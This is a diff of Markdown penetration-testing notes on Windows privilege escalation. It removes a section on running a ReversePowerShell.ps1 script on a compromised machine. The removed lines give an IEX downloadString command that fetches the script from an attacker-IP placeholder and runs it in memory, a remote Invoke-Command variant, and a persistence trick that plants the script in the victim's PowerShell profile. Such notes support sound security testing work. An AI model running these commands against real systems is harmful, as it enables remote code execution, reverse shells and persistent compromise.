@@ -226,10 +226,6 @@ In Linux the ouput will be colored using ANSI colors. If you are executing winpe
 
 ### -----
 
-* \`\`
-
-### -----
-
 [https://gitlab.com/pentest-tools/PayloadsAllTheThings/blob/master/Methodology and Resources/Windows - Privilege Escalation.md](https://gitlab.com/pentest-tools/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
 
 ### -----
@@ -242,40 +238,7 @@ In Linux the ouput will be colored using ANSI colors. If you are executing winpe
 
 ### -----
 
-#### Execute .ps1 scripts on compromised machine in memory
-
-If your are able to use `Invoke-Expresion` \(`IEX`\) this module can be imported using the following command. You can also copy and paste the functions into your PowerShell session so the cmdlets become available to run. Notice the .ps1 extension. When using `downloadString` this will need to be a ps1 file to inject the module into memory in order to run the cmdlets.
-
-```text
-IEX (New-Object -TypeName Net.WebClient).downloadString("http://<attacker_ipv4>/ReversePowerShell.ps1")
-```
-
-`IEX` is blocked from users in most cases and `Import-Module` is monitored by things such as ATP. Downloading files to a target's machine is not always allowed in a penetration test. Another method to use is `Invoke-Command`. This can be done using the following format.
-
-```text
-Invoke-Command -ComputerName <target device> -FilePath .'\ReversePowerShell.ps1m' -Credential (Get-Credential)
-```
-
-This will execute the file and it's contents on the remote computer.
-
-Another sneaky method would be to have the function load at the start of a new PowerShell window. This can be done by editing the `$PROFILE` file.
-
-```text
-Write-Verbose "Creates powershell profile for user"
-New-Item -Path $PROFILE -ItemType File -Force
-#
-# The $PROFILE VARIABLE IS EITHER GOING TO BE
-#    - C:\Users\<username>\Documents\WindowsPowerShell\Microsoft.PowerShell_profile.ps1
-# OR
-#    - C:\Users\<username>\OneDrive\Documents\WindowsPowerShell\Microsoft.PowerShell_profile.ps1
-#
-# Write-Verbose "Turning this module into the PowerShell profile will import all of the commands everytime the executing user opens a PowerShell session. This means you will need to open a new powershell session after doing this in order to access the commands. I assume this can be done by just executing the "powershell" command though you may need to have a new window opened or new reverse/bind shell opened. You can also just reload the profile
-cmd /c 'copy \\<attacker ip>\MyShare\ReversePowerShell.ps1 $env:USERPROFILE\Documents\WindowsPowerShell\Microsoft.PowerShell_profile.psm1
-
-powershell.exe
-# If that does not work try reloading the user profile.
-& $PROFILE
-```
+#### 
 
 ### -----
 
